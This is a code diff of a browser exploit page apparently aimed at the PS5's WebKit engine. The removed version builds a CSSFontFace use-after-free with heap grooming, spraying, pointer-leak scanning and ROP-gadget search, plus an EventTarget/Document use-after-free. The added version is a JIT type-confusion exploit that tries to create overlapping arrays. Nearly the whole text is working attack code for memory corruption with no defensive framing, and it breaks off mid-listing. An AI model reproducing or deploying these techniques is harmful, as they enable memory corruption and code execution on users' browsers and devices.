@@ -2,891 +2,253 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v63 - Corrected Scanner + lockedDocumentRef</title>
+<title>PS5 - DFG Type Confusion (No recursive)</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
-font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
-#out{position:fixed;top:0;left:0;right:0;bottom:0;
-padding:10px 14px;overflow-y:auto;font-size:12px;line-height:1.5;
--webkit-user-select:text}
-.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
-.mg{color:#ff00ff;font-weight:bold;font-size:14px}.dm{color:#006622}
-.hd{color:#00ff41;font-weight:bold;font-size:13px;letter-spacing:1px}
-</style>
-<style id="s">
-@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
-@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
+body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
+pre{white-space:pre-wrap;word-wrap:break-word}
+.ok{color:#00ff41}.er{color:#ff3333}.hl{color:#00ffff}.mg{color:#ff00ff;font-weight:bold}
 </style>
 </head>
 <body>
-<div id="out"></div>
+<pre id="o"></pre>
 <script>
-"use strict";
+var o=document.getElementById("o");
+function p(m,c){var s=document.createElement("span");if(c)s.className=c;
+s.textContent=m+"\n";o.appendChild(s);o.scrollTop=o.scrollHeight}
+function Ok(m){p("[+] "+m,"ok")}function Fl(m){p("[-] "+m,"er")}
+function Hi(m){p("[*] "+m,"hl")}function St(m){p("[!] "+m,"mg")}
 
-var O=document.getElementById("out");
-function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
-function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
-function Dm(m){P("  "+m,"dm")}function Hd(m){P("▸ "+m,"hd")}
-function Sep(){P("─".repeat(50),"dm")}
+p("=== DFG Type Confusion (No recursive) ===\n");
 
-window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true};
+try {
+    var arr = new Array(0x40_0000).fill(1.1);
+    var ai = arr.length - 1;
+    var rc = [];
 
-// ============================================================
-// GLOBAL: lockedDocumentRef for EventTarget Phase 5
-// ============================================================
-var lockedDocumentRef = null;
-
-// ============================================================
-// MEMORY UTILITIES (v63 — Corrected isPointer)
-// ============================================================
-var Mem = {
-    strToHex: function(str, maxLen) {
-        if (!maxLen) maxLen = str.length;
-        var hex = "";
-        for (var i = 0; i < Math.min(str.length, maxLen); i++) {
-            var code = str.charCodeAt(i);
-            var h = (code & 0xFF).toString(16);
-            hex += (h.length === 1 ? "0" + h : h) + " ";
-        }
-        return hex.trim();
-    },
-    
-    strToU64: function(str) {
-        if (!str || str.length < 1) return 0n;
-        var val = 0n;
-        for (var i = 0; i < Math.min(str.length, 8); i++) {
-            var code = BigInt(str.charCodeAt(i) & 0xFF);
-            val |= (code << BigInt(i * 8));
-        }
-        return val;
-    },
-    
-    // CORRECTED: Filters out ASCII string false positives
-    // ASCII printable range packed as 32-bit: 0x20202020 to 0x7E7E7E7E
-    isPointer: function(val) {
-        if (typeof val !== "bigint") return false;
-        var lo = Number(val & 0xFFFFFFFFn);
-        // Exclude basic ASCII ranges (0x20 to 0x7E packed in 32-bit)
-        // This eliminates false positives from strings like "test" (0x74657374)
-        if (lo >= 0x20202020 && lo <= 0x7E7E7E7E) return false;
+    function foo(flag, k, allocCount) {
+        var A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
+        arr[ai] = A;
+        var gc = [];
+        var a = new Date(1111);
+        a[0] = 1.1;
         
-        var hi = Number(val >> 32n);
-        // PS5 userland pointers: hi=0x0000 or hi=0x0001
-        if (hi === 0 || hi === 1) return lo > 0x10000;
-        // Kernel pointers: hi=0xFFFF
-        if (hi === 0xFFFF) return true;
-        return false;
-    },
-    
-    bigToHex: function(val) {
-        return "0x" + val.toString(16).padStart(16, "0");
-    },
-    
-    // Check if string contains non-printable ASCII (raw memory indicator)
-    hasRawMemory: function(str) {
-        for (var i = 0; i < str.length; i++) {
-            var c = str.charCodeAt(i);
-            if (c < 0x20 || c > 0x7E) return true;
+        // GC pressure via ArrayBuffer (NO recursive)
+        for (var j = 0; j < allocCount; ++j) {
+            gc.push(new ArrayBuffer(0x80_0000)); // 8MB each
         }
-        return false;
-    },
-    
-    findGadgets: function(hexStr) {
-        var gadgets = {
-            "5f c3": "pop rdi; ret",
-            "5e c3": "pop rsi; ret",
-            "5a c3": "pop rdx; ret",
-            "58 c3": "pop rax; ret",
-            "59 c3": "pop rcx; ret",
-            "41 58 c3": "pop r8; ret",
-            "41 59 c3": "pop r9; ret",
-            "0f 05 c3": "syscall; ret",
-            "0f 05": "syscall",
-            "c3": "ret",
-            "48 87 e3": "xchg rsp, rbx",
-            "48 94": "xchg rsp, rax",
-        };
-        var found = [];
-        var lower = hexStr.toLowerCase().replace(/\s/g, "");
-        for (var pattern in gadgets) {
-            var cleanPattern = pattern.replace(/\s/g, "");
-            var idx = lower.indexOf(cleanPattern);
-            if (idx !== -1 && idx % 2 === 0) {
-                found.push({
-                    offset: idx / 2,
-                    bytes: pattern,
-                    name: gadgets[pattern]
-                });
-            }
-        }
-        return found;
-    }
-};
-
-P("════════════════════════════════════","hd");
-P("  v63 — Corrected Scanner + lockedDocumentRef","hd");
-P("  Fix 1: isPointer filters ASCII false positives","hd");
-P("  Fix 2: lockedDocumentRef retains JS wrapper","hd");
-P("════════════════════════════════════","hd");
-P("");
-
-// Font base64
-var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
-for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
-function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-function fs(){try{void document.body.offsetTop}catch(e){}}
-
-var sh=document.getElementById("s").sheet;
-var keep=[],holes=[],trigger=null,uafOk=false;
-
-// ============================================================
-// PHASE 1: CSSFONTFACE UAF SETUP
-// ============================================================
-Sep();Hd("PHASE 1: CSSFontFace UAF Setup");Sep();
-
-Hd("Creating heap holes...");
-for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
-unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();Ok("Holes ready: "+holes.length);
-
-Hd("Trigger setup...");
-trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(trigger);void trigger.loaded;
-for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
-fs();
-var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
-var fsh=fst.sheet;
-for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();Ok("Trigger ready");
-
-Hd("UAF + CSSRule Spray...");
-Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){if(this===trigger&&!uafOk){uafOk=true;
-try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-fs()}catch(e){}
-Dm("GC pressure (16MB)...");
-for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-Dm("Spraying 2048 A_ faces...");
-for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
-fs();
-try{var d=document.createElement("div");d.textContent="AB";
-d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-document.body.appendChild(d);void d.offsetWidth}catch(e){}
-}return undefined}});
-
-var rn=0;var raf=function(){rn++;
-if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
-if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
-
-// ============================================================
-// PHASE 2: IDENTIFY CONFUSED OBJECT
-// ============================================================
-Sep();Hd("PHASE 2: Identify Confused Object");Sep();
-
-document.fonts.load("1em trigger, x", "AB").then(function(faces) {
-    P("  load() returned " + faces.length + " faces");
-    
-    var aFamily = null, aFace = null;
-    for (var i = 0; i < faces.length; i++) {
-        var f = faces[i];
-        P("  Face[" + i + "]: family=" + f.family + " weight=" + f.weight);
-        if (f.family && f.family.indexOf("A_") === 0) {
-            aFamily = f.family;
-            aFace = f;
-        }
-    }
-    
-    if (!aFamily) { Fl("No A_ face found"); return; }
-    St("RECLAIMED: " + aFamily);
-    keep.push(faces); keep.push(aFace);
-    
-    var aIndex = -1;
-    for (var i = 0; i < sh.cssRules.length; i++) {
-        try {
-            var r = sh.cssRules[i];
-            if (r.type === 5) {
-                if (r.style.getPropertyValue("font-family").indexOf(aFamily) !== -1) {
-                    aIndex = i; break;
-                }
-            }
-        } catch(e) {}
-    }
-    if (aIndex === -1) { Fl("CSSRule not found"); return; }
-    Ok("Found CSSRule at index " + aIndex);
-    var aRule = sh.cssRules[aIndex];
-    var aStyle = aRule.style;
-    
-    aStyle.setProperty("font-weight", "700"); fs();
-    if (String(aFace.weight) !== "700") { Fl("Confusion dead"); return; }
-    Ok("Confusion ALIVE — weight = 700");
-    
-    // ============================================================
-    // PHASE 3: READ64 SCANNER (Corrected isPointer)
-    // ============================================================
-    Sep();Hd("PHASE 3: Read64 Scanner (Corrected isPointer)");Sep();
-    P("  isPointer now filters ASCII range 0x20202020-0x7E7E7E7E","dm");
-    P("  This eliminates false positives from string values","dm");
-    P("");
-    
-    var pointerLeaks = [];
-    var gadgetFindings = [];
-    var rawMemoryLeaks = [];
-    
-    // === SCAN 1: Baseline reads with corrected pointer check ===
-    Hd("SCAN 1: Baseline reads (corrected filter)");
-    
-    var testFamilies = [
-        "test", "AAAA", "BBBB",
-        "\u4141\u4141\u4141\u4141",
-        "\u0000\u0000\u0000\u0000",
-        "\uFFFF\uFFFF\uFFFF\uFFFF",
-        "x", "", "normal", "serif", "monospace"
-    ];
-    
-    for (var ti = 0; ti < testFamilies.length; ti++) {
-        var writeVal = testFamilies[ti];
-        var writeDisplay = writeVal.length === 0 ? "(empty)" : 
-                          writeVal.replace(/[\u0000-\u001F\u007F-\uFFFF]/g, function(c) {
-                              return "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0");
-                          });
         
-        try {
-            aStyle.setProperty("font-family", writeVal); fs();
-            var readVal = aFace.family;
-            var readHex = Mem.strToHex(readVal, 64);
-            var readU64 = Mem.strToU64(readVal);
-            var isPtr = Mem.isPointer(readU64);
-            var hasRaw = Mem.hasRawMemory(readVal);
-            
-            P("  Write: '" + writeDisplay + "' → Read: '" + 
-              (hasRaw ? "(raw memory, " + readVal.length + " bytes)" : readVal) + "'", "dm");
-            P("    Hex: " + readHex, "dm");
-            P("    U64: " + Mem.bigToHex(readU64), "dm");
-            
-            if (isPtr) {
-                Hi("    ✅ POINTER DETECTED: " + Mem.bigToHex(readU64));
-                pointerLeaks.push({
-                    writeVal: writeDisplay,
-                    readVal: readVal,
-                    hex: readHex,
-                    ptr: readU64,
-                    ptrHex: Mem.bigToHex(readU64),
-                    source: "SCAN 1 baseline"
-                });
-            } else {
-                Dm("    (filtered — not a pointer)");
-            }
-            
-            if (hasRaw) {
-                Hi("    ✅ RAW MEMORY DETECTED — non-ASCII bytes in return value!");
-                rawMemoryLeaks.push({
-                    writeVal: writeDisplay,
-                    readVal: readVal,
-                    hex: readHex,
-                    source: "SCAN 1 baseline"
-                });
-            }
-            
-            var gadgets = Mem.findGadgets(readHex);
-            if (gadgets.length > 0) {
-                St("    ROP GADGETS FOUND!");
-                for (var gi = 0; gi < gadgets.length; gi++) {
-                    P("      @offset " + gadgets[gi].offset + ": " + gadgets[gi].name, "hl");
-                    gadgetFindings.push({
-                        writeVal: writeDisplay,
-                        offset: gadgets[gi].offset,
-                        name: gadgets[gi].name,
-                        context: readHex
-                    });
-                }
-            }
-        } catch(e) {
-            Fl("  Error: " + e.message);
+        A.p2 = gc;
+        var b = { p0: 0x42424242, p1: 1.1 };
+        var f = b;
+        if (flag) { f = 1.1; }
+        A.p1 = f;
+        
+        // Reduced loop: 1e4 instead of 1e6 (enough for DFG trigger)
+        var v = 1.1;
+        for (var i = 0; i < 1e4; ++i) {
+            for (var j = 0; j < k; ++j) { v = i; v = j; }
         }
-        P("");
+        b.p0 = v;
+        b.p1 = a;
     }
+
+    // ============================================================
+    // Phase 1: DFG Warmup (50 invocations — enough for DFG)
+    // ============================================================
+    Hi("Phase 1: DFG Warmup (50 calls)...");
+    Hi("Each call has 1e4 loop (was 1e6 — 100x faster)");
     
-    // === SCAN 2: Stale pointer check ===
-    Hd("SCAN 2: Stale pointer check");
+    foo(true, 1, 1);   // Initial type specialization
+    foo(false, 1, 1);  // Contradict type
     
-    aStyle.setProperty("font-family", "marker_value_1"); fs();
-    var r1 = aFace.family;
-    P("  Read 1: " + r1 + " (hex: " + Mem.strToHex(r1, 32) + ")", "dm");
-    
-    var r2 = aFace.family;
-    P("  Read 2 (same): " + r2 + " (hex: " + Mem.strToHex(r2, 32) + ")", "dm");
-    
-    aStyle.setProperty("font-family", "marker_value_2"); fs();
-    var r3 = aFace.family;
-    P("  Read 3 (changed): " + r3 + " (hex: " + Mem.strToHex(r3, 32) + ")", "dm");
-    
-    var r4 = aFace.family;
-    P("  Read 4 (same): " + r4 + " (hex: " + Mem.strToHex(r4, 32) + ")", "dm");
-    
-    if (r1 !== r2) {
-        Hi("  STALE POINTER: Read 1 ≠ Read 2!");
-        var staleU64 = Mem.strToU64(r2);
-        if (Mem.isPointer(staleU64)) {
-            Hi("  STALE POINTER VALUE: " + Mem.bigToHex(staleU64));
-            pointerLeaks.push({
-                writeVal: "marker_value_1 (stale read 2)",
-                readVal: r2,
-                hex: Mem.strToHex(r2, 64),
-                ptr: staleU64,
-                ptrHex: Mem.bigToHex(staleU64),
-                source: "SCAN 2 stale pointer"
-            });
-        }
+    var warmupStart = Date.now();
+    for (var i = 0; i < 50; ++i) {
+        foo(false, 0, 0);  // Fast warmup (k=0, no alloc)
+        if (i % 10 === 0) p("  Warmup " + i + "/50...");
     }
-    P("");
+    Ok("Warmup done in " + (Date.now() - warmupStart) + "ms");
+
+    // ============================================================
+    // Phase 2: GC pressure (replaces recursive)
+    // ============================================================
+    Hi("Phase 2: GC pressure via ArrayBuffer...");
     
-    // === SCAN 3: Rapid cycling ===
-    Hd("SCAN 3: Rapid family cycling (20 iterations)");
-    
-    var cycleMismatches = [];
-    for (var ci = 0; ci < 20; ci++) {
-        try {
-            aStyle.setProperty("font-family", "cycle_" + ci); fs();
-            var rv = aFace.family;
-            var hex = Mem.strToHex(rv, 32);
-            var u64 = Mem.strToU64(rv);
-            var isPtr = Mem.isPointer(u64);
-            var hasRaw = Mem.hasRawMemory(rv);
-            
-            if (rv !== "cycle_" + ci || isPtr || hasRaw) {
-                P("  Cycle " + ci + ": MISMATCH!", "wr");
-                P("    Expected: cycle_" + ci, "dm");
-                P("    Got: " + (hasRaw ? "(raw memory)" : rv), "dm");
-                P("    Hex: " + hex, "dm");
-                
-                if (isPtr) {
-                    Hi("    POINTER: " + Mem.bigToHex(u64));
-                    pointerLeaks.push({
-                        writeVal: "cycle_" + ci,
-                        readVal: rv,
-                        hex: hex,
-                        ptr: u64,
-                        ptrHex: Mem.bigToHex(u64),
-                        source: "SCAN 3 cycle " + ci
-                    });
-                }
-                if (hasRaw) {
-                    Hi("    RAW MEMORY in return value!");
-                    rawMemoryLeaks.push({
-                        writeVal: "cycle_" + ci,
-                        readVal: rv,
-                        hex: hex,
-                        source: "SCAN 3 cycle " + ci
-                    });
-                }
-                
-                cycleMismatches.push({cycle: ci, expected: "cycle_"+ci, got: rv, hex: hex});
-            }
-        } catch(e) {}
-    }
-    
-    if (cycleMismatches.length === 0) {
-        Dm("  All 20 cycles matched — no stale pointer detected");
-    }
-    P("");
-    
-    // === SCAN 4: GC between reads ===
-    Hd("SCAN 4: GC between reads");
-    
-    aStyle.setProperty("font-family", "pre_gc_value"); fs();
-    var preGC = aFace.family;
-    P("  Pre-GC: " + preGC, "dm");
-    P("  Pre-GC hex: " + Mem.strToHex(preGC, 32), "dm");
-    
-    P("  Forcing GC (32MB)...","dm");
-    for (var i = 0; i < 8; i++) {
+    // Allocate and release to trigger GC cycles
+    for (var i = 0; i < 20; i++) {
         var t = [];
-        for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
+        for (var j = 0; j < 50; j++) t.push(new ArrayBuffer(0x100000)); // 1MB each
+        // Release — GC will collect these
     }
-    fs();
+    Ok("GC pressure applied");
+
+    // ============================================================
+    // Phase 3: Trigger overlap (100 attempts, no recursive)
+    // ============================================================
+    Hi("Phase 3: Trigger overlap (100 attempts)...");
+    Hi("NO recursive() — just ArrayBuffer pressure");
     
-    var postGC = aFace.family;
-    P("  Post-GC: " + postGC, "dm");
-    P("  Post-GC hex: " + Mem.strToHex(postGC, 32), "dm");
-    
-    if (preGC !== postGC) {
-        St("  GC CHANGED THE VALUE!");
-        var postU64 = Mem.strToU64(postGC);
-        if (Mem.isPointer(postU64)) {
-            Hi("  POST-GC POINTER: " + Mem.bigToHex(postU64));
-            pointerLeaks.push({
-                writeVal: "pre_gc_value",
-                readVal: postGC,
-                hex: Mem.strToHex(postGC, 64),
-                ptr: postU64,
-                ptrHex: Mem.bigToHex(postU64),
-                source: "SCAN 4 post-GC"
-            });
-        }
-        if (Mem.hasRawMemory(postGC)) {
-            Hi("  POST-GC RAW MEMORY!");
-            rawMemoryLeaks.push({
-                writeVal: "pre_gc_value",
-                readVal: postGC,
-                hex: Mem.strToHex(postGC, 64),
-                source: "SCAN 4 post-GC"
-            });
-        }
-        var postGadgets = Mem.findGadgets(Mem.strToHex(postGC, 64));
-        if (postGadgets.length > 0) {
-            St("  GADGETS IN POST-GC DATA!");
-            for (var gi = 0; gi < postGadgets.length; gi++) {
-                P("    " + postGadgets[gi].name, "hl");
-            }
-        }
-    } else {
-        Dm("  GC did not change the value");
-    }
-    P("");
-    
-    // === SCAN 5: Multiple GC cycles ===
-    Hd("SCAN 5: Multiple GC cycles (5 iterations)");
-    
-    for (var gci = 0; gci < 5; gci++) {
-        aStyle.setProperty("font-family", "gc_test_" + gci); fs();
-        var beforeVal = aFace.family;
-        var beforeHex = Mem.strToHex(beforeVal, 32);
+    var win = false;
+    var ba, ua;
+    var triggerStart = Date.now();
+
+    for (var k = 0; k < 100 && !win; ++k) {
+        // Trigger foo with GC pressure
+        foo(false, 10, k % 5 + 1);
         
-        for (var i = 0; i < 4; i++) {
+        // GC pressure via ArrayBuffer (replaces recursive(10000))
+        for (var i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
+        
+        // Additional GC pressure
+        if (k % 10 === 0) {
             var t = [];
-            for (var j = 0; j < 128; j++) t.push(new ArrayBuffer(65536));
+            for (var j = 0; j < 20; j++) t.push(new ArrayBuffer(0x100000));
         }
-        fs();
         
-        var afterVal = aFace.family;
-        var afterHex = Mem.strToHex(afterVal, 32);
+        var fd = arr[ai].p1.p1;
+        var nc = 13.37;
         
-        if (beforeVal !== afterVal) {
-            Hi("  GC cycle " + gci + ": VALUE CHANGED!");
-            P("    Before: " + beforeHex, "dm");
-            P("    After:  " + afterHex, "dm");
-            
-            var afterU64 = Mem.strToU64(afterVal);
-            if (Mem.isPointer(afterU64)) {
-                Hi("    POINTER: " + Mem.bigToHex(afterU64));
-                pointerLeaks.push({
-                    writeVal: "gc_test_" + gci,
-                    readVal: afterVal,
-                    hex: afterHex,
-                    ptr: afterU64,
-                    ptrHex: Mem.bigToHex(afterU64),
-                    source: "SCAN 5 GC cycle " + gci
-                });
+        for (var i = 0; i < 16; ++i) {
+            var a2 = [13.37, 2.2, 3.3, 4.4, nc];
+            rc.push(a2);
+            if (fd[0] === 13.37) {
+                win = true;
+                ba = rc[rc.length - 1];
+                ba[0] = {};
+                ua = fd;
+                break;
             }
-            if (Mem.hasRawMemory(afterVal)) {
-                Hi("    RAW MEMORY!");
-                rawMemoryLeaks.push({
-                    writeVal: "gc_test_" + gci,
-                    readVal: afterVal,
-                    hex: afterHex,
-                    source: "SCAN 5 GC cycle " + gci
-                });
-            }
-        } else {
-            Dm("  GC cycle " + gci + ": no change");
         }
+        
+        if (k % 10 === 0) p("  Attempt " + k + "/100... (" + (Date.now() - triggerStart) + "ms)");
     }
-    P("");
-    
-    // ============================================================
-    // PHASE 4: CSSFONTFACE SCANNER SUMMARY
-    // ============================================================
-    Sep();Hd("PHASE 4: CSSFontFace Scanner Summary");Sep();
-    P("");
-    P("  Pointer leaks (corrected): " + pointerLeaks.length, pointerLeaks.length > 0 ? "hl" : "dm");
-    P("  Raw memory leaks: " + rawMemoryLeaks.length, rawMemoryLeaks.length > 0 ? "hl" : "dm");
-    P("  ROP gadgets found: " + gadgetFindings.length, gadgetFindings.length > 0 ? "hl" : "dm");
-    P("  Cycle mismatches: " + cycleMismatches.length, cycleMismatches.length > 0 ? "hl" : "dm");
-    P("");
-    
-    if (pointerLeaks.length > 0) {
-        St("★ POINTER LEAKS VIA CSSFONTFACE! ★");
-        for (var i = 0; i < pointerLeaks.length; i++) {
-            P("  [" + i + "] " + pointerLeaks[i].ptrHex + " (source: " + pointerLeaks[i].source + ")");
-        }
-    }
-    if (rawMemoryLeaks.length > 0) {
-        St("★ RAW MEMORY LEAKS VIA CSSFONTFACE! ★");
-        for (var i = 0; i < rawMemoryLeaks.length; i++) {
-            P("  [" + i + "] source: " + rawMemoryLeaks[i].source);
-            P("      hex: " + rawMemoryLeaks[i].hex.substring(0, 48));
-        }
-    }
-    P("");
-    
-    // ============================================================
-    // PHASE 5: EVENTTARGET UAF — lockedDocumentRef
-    // ============================================================
-    Sep();Hd("PHASE 5: EventTarget UAF — lockedDocumentRef");Sep();
-    P("  Using lockedDocumentRef to retain JS wrapper","dm");
-    P("  while C++ Document is freed and reclaimed","dm");
-    P("");
-    
-    // Reset lockedDocumentRef
-    lockedDocumentRef = null;
-    
-    var etPointerLeaks = [];
-    var etRawLeaks = [];
-    var etGadgets = [];
-    
-    try {
-        var f2 = document.body.appendChild(document.createElement('iframe'));
-        var a2 = document.createElement('div');
-        var b2 = a2.appendChild(document.createElement('div'));
-        
-        // CRITICAL: Lock the document reference BEFORE destruction
-        lockedDocumentRef = f2.contentDocument;
-        P("  lockedDocumentRef set: " + lockedDocumentRef, "dm");
-        P("  lockedDocumentRef.URL: " + lockedDocumentRef.URL, "dm");
-        P("  lockedDocumentRef.nodeType: " + lockedDocumentRef.nodeType, "dm");
-        P("");
-        
-        // LISTENER 1: Free Document + GC + spray
-        a2.addEventListener('b', function() {
-            P("  [L1] Freeing iframe and Document...", "dm");
-            document.adoptNode(a2);
-            f2.remove();
-            
-            // Force GC — this frees the C++ Document object
-            // but lockedDocumentRef keeps the JS wrapper alive
-            P("  [L1] GC pressure (32MB)...", "dm");
-            for (var i = 0; i < 8; i++) {
-                var t = [];
-                for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
-            }
-            
-            // Spray Float64Arrays to reclaim the freed C++ Document slot
-            P("  [L1] Spraying 500 Float64Arrays (256 bytes each)...", "dm");
-            var spray = [];
-            for (var i = 0; i < 500; i++) {
-                var buf = new ArrayBuffer(256);
-                var f64 = new Float64Array(buf);
-                // Fill with distinctive marker pattern
-                f64[0] = 1.1;
-                f64[1] = 2.2;
-                f64[2] = 3.3;
-                f64[3] = 4.4;
-                f64[4] = 5.5;
-                f64[5] = 6.6;
-                f64[6] = 7.7;
-                f64[7] = 8.8;
-                spray.push(f64);
-            }
-            
-            // Also spray strings (they share general heap with Document)
-            P("  [L1] Spraying 200 strings (256 bytes each)...", "dm");
-            var strSpray = [];
-            for (var i = 0; i < 200; i++) {
-                var s = "S".repeat(128) + String.fromCharCode(i & 0xFF) + String.fromCharCode((i >> 8) & 0xFF);
-                strSpray.push(s);
-            }
-            
-            P("  [L1] Spray complete. Throwing to continue dispatch...", "dm");
-            
-            throw {
-                line: 1,
-                column: 1,
-                sourceURL: 'X'.repeat(1024 * 1024) // 1MB
-            };
-        });
-        
-        // LISTENER 2: Buffer (catches throw, continues dispatch)
-        a2.addEventListener('b', function() {
-            P("  [L2] Buffer listener executed", "dm");
-        });
-        
-        // LISTENER 3: Read freed Document via lockedDocumentRef
-        // The JS wrapper is alive (lockedDocumentRef holds it)
-        // but the C++ Document underneath may be freed and reclaimed
-        a2.addEventListener('b', function() {
-            P("  [L3] Third listener — reading via lockedDocumentRef...\n", "hl");
-            
-            if (!lockedDocumentRef) {
-                Fl("  lockedDocumentRef is null");
-                return;
-            }
-            
-            P("  lockedDocumentRef is NOT null — JS wrapper alive", "ok");
-            P("  Attempting to read properties through retained wrapper...", "dm");
-            P("");
-            
-            // Read all properties — the C++ getter will dereference
-            // the internal pointer, which may point to freed/reclaimed memory
-            var props = [
-                "nodeType", "nodeName", "URL", "title", "domain",
-                "referrer", "cookie", "readyState", "compatMode",
-                "characterSet", "contentType", "documentElement",
-                "head", "body", "images", "links", "forms", "scripts",
-                "styleSheets", "fonts", "implementation", "location",
-                "defaultView", "activeElement", "currentScript",
-                "visibilityState", "hidden", "fullscreenEnabled",
-                "childElementCount", "firstElementChild", "lastElementChild",
-                "contentType", "characterSet", "compatMode",
-                "pointerLockElement", "fullscreenElement",
-                "rootElement", "styleSheetSets",
-                "xmlEncoding", "xmlVersion", "xmlStandalone"
-            ];
-            
-            var unusualCount = 0;
-            var totalProps = 0;
-            
-            for (var i = 0; i < props.length; i++) {
-                try {
-                    var val = lockedDocumentRef[props[i]];
-                    var str = String(val);
-                    var unusual = false;
-                    totalProps++;
-                    
-                    // Check for pointer-like numbers
-                    if (typeof val === "number" && val > 0x10000) {
-                        // Apply same ASCII filter
-                        var lo = val & 0xFFFFFFFF;
-                        if (!(lo >= 0x20202020 && lo <= 0x7E7E7E7E)) {
-                            unusual = true;
-                            Hi("  [+] " + props[i] + " = " + val + " (0x" + val.toString(16) + ") ← POINTER LEAK!");
-                            etPointerLeaks.push({
-                                prop: props[i],
-                                value: val,
-                                hex: "0x" + val.toString(16),
-                                source: "lockedDocumentRef"
-                            });
-                        }
-                    }
-                    // Check for non-ASCII (raw memory)
-                    else if (Mem.hasRawMemory(str) && str !== "[object HTMLDocument]" && str !== "[object Document]") {
-                        unusual = true;
-                        Hi("  [+] " + props[i] + " = (raw memory) ← MEMORY LEAK!");
-                        P("    hex: " + Mem.strToHex(str, 64), "hl");
-                        etRawLeaks.push({
-                            prop: props[i],
-                            value: str,
-                            hex: Mem.strToHex(str, 64),
-                            source: "lockedDocumentRef"
-                        });
-                        
-                        // Search for gadgets in raw memory
-                        var gadgets = Mem.findGadgets(Mem.strToHex(str, 128));
-                        if (gadgets.length > 0) {
-                            St("    ROP GADGETS FOUND IN RAW MEMORY!");
-                            for (var gi = 0; gi < gadgets.length; gi++) {
-                                P("      @offset " + gadgets[gi].offset + ": " + gadgets[gi].name, "hl");
-                                etGadgets.push(gadgets[gi]);
-                            }
-                        }
-                    }
-                    // Check for changed defaults
